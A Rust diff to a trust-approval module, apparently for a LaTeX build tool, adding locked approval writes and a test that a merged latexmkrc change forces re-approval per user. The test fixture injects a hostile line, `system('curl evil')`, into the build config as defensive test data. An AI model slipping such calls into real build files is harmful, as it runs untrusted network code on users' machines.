@@ -220,9 +220,12 @@ fn approve_in(
                     approved — run the action again to review the current version."
             .to_string());
     }
-    let mut approvals = load(store);
-    approvals.insert(key(kind, dir), expected.to_string());
-    storage::write_json_atomic(store, &approvals).map_err(|e| e.to_string())
+    // A read-modify-write under the file's lock: the window and its desktop
+    // sidecar both approve into this one store (final review B4).
+    storage::patch_json(store, BTreeMap::<String, String>::new(), |approvals| {
+        approvals.insert(key(kind, dir), expected.to_string());
+        Ok(())
+    })
 }
 
 fn collect(kind: TrustKind, dir: &Path) -> Vec<Subject> {
@@ -576,6 +579,50 @@ fn prettier_subjects(start: &Path) -> Vec<Subject> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Hosted plan §6.5 gate 3: trust never crosses users (each daemon's own
+    /// store in its own state dir), and a merge that changes a trust-gated
+    /// file asks again — approvals are bound to content, so what a co-member
+    /// merged in is never run on the strength of an approval of what was
+    /// there before.
+    #[test]
+    fn a_merge_that_changes_a_gated_file_asks_again_and_trust_is_per_user() {
+        let tmp = tempfile::tempdir().unwrap();
+        let repo = tmp.path().join("clone");
+        std::fs::create_dir_all(&repo).unwrap();
+        let git = |args: &[&str]| {
+            let out = std::process::Command::new("git")
+                .args(["-c", "user.name=t", "-c", "user.email=t@example.invalid", "-c", "init.defaultBranch=main", "-c", "core.hooksPath=", "-c", "commit.gpgsign=false"])
+                .args(args)
+                .current_dir(&repo)
+                .env("GIT_CONFIG_GLOBAL", "/dev/null")
+                .output()
+                .unwrap();
+            assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+        };
+        git(&["init", "-q"]);
+        std::fs::write(repo.join("latexmkrc"), "$pdf_mode = 1;\n").unwrap();
+        git(&["add", "latexmkrc"]);
+        git(&["commit", "-qm", "rc"]);
+        git(&["checkout", "-qb", "member"]);
+        std::fs::write(repo.join("latexmkrc"), "$pdf_mode = 1; system('curl evil');\n").unwrap();
+        git(&["commit", "-qam", "member's rc"]);
+        git(&["checkout", "-q", "main"]);
+
+        let bob = tmp.path().join("bob-state.json");
+        let alice = tmp.path().join("alice-state.json");
+        let err = require_in(&bob, TrustKind::Latexmkrc, &repo, latexmkrc_subjects(&repo)).unwrap_err();
+        let fp = request_of(err)["fingerprint"].as_str().unwrap().to_string();
+        approve_in(&bob, TrustKind::Latexmkrc, &repo, latexmkrc_subjects(&repo), &fp).unwrap();
+        assert!(require_in(&bob, TrustKind::Latexmkrc, &repo, latexmkrc_subjects(&repo)).is_ok());
+        assert!(require_in(&alice, TrustKind::Latexmkrc, &repo, latexmkrc_subjects(&repo)).is_err(), "bob's approval is not alice's");
+
+        git(&["merge", "-q", "--no-edit", "member"]);
+        let err = require_in(&bob, TrustKind::Latexmkrc, &repo, latexmkrc_subjects(&repo)).unwrap_err();
+        let req = request_of(err);
+        assert_eq!(req["changed"], true, "the merge re-asks");
+        assert!(req["items"][0]["preview"].as_str().unwrap().contains("curl evil"), "and shows what came in");
+    }
 
     fn subj(label: &str, body: &str) -> Subject {
         Subject { label: label.into(), bytes: body.as_bytes().to_vec(), preview: true }
